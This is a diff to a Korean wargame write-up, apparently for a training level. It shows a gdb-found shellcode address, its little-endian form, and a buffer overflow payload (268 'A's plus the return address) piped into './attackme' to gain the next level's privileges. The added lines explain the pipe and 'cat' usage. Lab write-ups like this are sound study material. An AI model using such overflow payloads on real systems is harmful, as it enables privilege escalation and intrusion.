@@ -161,6 +161,12 @@ gdb를 확인해보면
 쉘 코드 주소 : 0xbffffc1d  
 리틀엔디안 변환 : \x1d\xfc\xff\xbf 
 
-페이로드 : $(python -c'print "A"*268 + "\x1d\xfc\xff\xbf"', cat) | ./attackme  
+* 페이로드 : $(python -c'print "A"*268 + "\x1d\xfc\xff\xbf"', cat) | ./attackme  
 를 입력하면 권한이 얻어지고 my-pass로 level13의 패스워드를 확인한다  
-
+    - '|'를 사용하는 이유는 gets가 프로그램 시작 중에 입력을 받기 때문이고 level11에서는 프로그램이 실행디는 동시에 인자를 받았기 때문에 '|'를 사용하지 않았다.  
+    - |(pipe)를 사용하면 pipe 이전의 결과 값이 pipe 이후의 입력값이 됨  
+    ===>  $(python -c'print "A"*268 + "\x1d\xfc\xff\xbf"', cat)이 결과가 ./attackme의 데이터로 들어가게 됨  
+    - cat을 쓰는 이유는 cat을 쓰지않으면 ./attackme가 표준입력을 받지 못하기 때문  
+    ===> 동시에 같이 써줘야 함  
+    - ';'을 이용하면 동시에 여러 명령어를 사용할 수 있음  
+    -   따라서 $(python -c'print "A"*268 + "\x1d\xfc\xff\xbf"', cat) | ./attackme 이런 형식의 페이로드가 나오게 된다  
